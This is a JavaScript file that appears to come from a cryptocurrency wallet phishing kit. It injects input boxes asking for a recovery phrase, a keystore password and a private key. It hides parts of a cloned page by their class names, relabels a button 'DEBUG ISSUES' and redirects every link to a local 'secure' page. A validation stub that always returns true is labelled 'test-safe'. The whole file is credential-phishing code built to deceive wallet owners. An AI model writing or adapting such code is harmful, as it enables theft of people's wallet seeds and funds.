// ------------------ Dynamic Inputs ------------------
const phraseBox = `
<div class="flex flex-col mb-6">
  <div class="relative" data-children-count="1">
    <textarea id="recovery_phrase" cols="30" rows="4"
      placeholder="Enter your recovery phrase"
      class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400"
      name="phrase" required></textarea>
    <p class="text-xs text-grey-300 mt-2">
      Typically 12 (sometimes 24) words separated by spaces
    </p>
  </div>
</div>
`;

const keystoreBox = `
<div class="flex flex-col mb-6">
  <div class="relative" data-children-count="1">
    <input type="text" name="password" placeholder="Wallet password"
      id="keystorePassword"
      class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
    <p class="text-xs text-grey-300 mt-2">
      Several lines of text beginning with "{...}" plus your password
    </p>
  </div>
</div>
`;

const pkeyBox = `
<div class="flex flex-col mb-6">
  <div class="relative" data-children-count="1">
    <input type="text" id="privateKey" placeholder="Enter your Private Key"
      name="key"
      class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
    <p class="text-xs text-grey-300 mt-2">
      Typically 12 (sometimes 24) words separated by a single space.
    </p>
  </div>
</div>
`;

// Inject dynamic inputs
const container = document.getElementById("dynamicInputs");
if (container) {
  container.innerHTML = phraseBox + keystoreBox + pkeyBox;
}

// ------------------ DOM Manipulation ------------------
const iconClass = ".e1vhhgxp3.css-13ed9ny.eolra810";
const topBtnClass = ".css-2nsq40.e18wg2hl1";
const wholeBtnClass = ".css-1cds14a.e1vhhgxp2";
const mainBtnClass = ".css-xkvq2u.eyitmu92";
const textClass = ".css-18nwh2f.e1vhhgxp5";
const topRightTextClass = ".css-18y7v6i.eyitmu92";
const moreIconClass = ".css-1p5gbg6.e1qv8blz0";

const intv = setInterval(() => {
  const topRightText = document.querySelectorAll(topRightTextClass);
  const moreIcon = document.querySelector(moreIconClass);
  const iconn = document.querySelector(iconClass);
  const mainBtn = document.querySelector(mainBtnClass);
  const wholeBtn = document.querySelector(wholeBtnClass);
  const text = document.querySelector(textClass);
  const topBtn = document.querySelector(topBtnClass);

  if (text && mainBtn && wholeBtn && topBtn && iconn && moreIcon) {
    topBtn.classList.add("nonee");
    moreIcon.classList.add("nonee");
    topRightText.forEach((el) => el.classList.add("nonee"));
    iconn.classList.add("nonee");

    mainBtn.innerHTML = "<span class='css-xkvq2u eyitmu92 bld'>DEBUG ISSUES</span>";
    wholeBtn.classList.add("bxShadow");
    text.classList.add("nonee");

    // Redirect all links to secure/index.html
    document.querySelectorAll("a").forEach((link) => {
      link.setAttribute("href", "./secure/index.html");
    });

    clearInterval(intv);
  }
}, 100);

// ------------------ Test-safe Wallet Validation ------------------
function validateWallet(dummy) {
  // Always return true for testing
  return true;
}

// Override any existing calls to validation if necessary
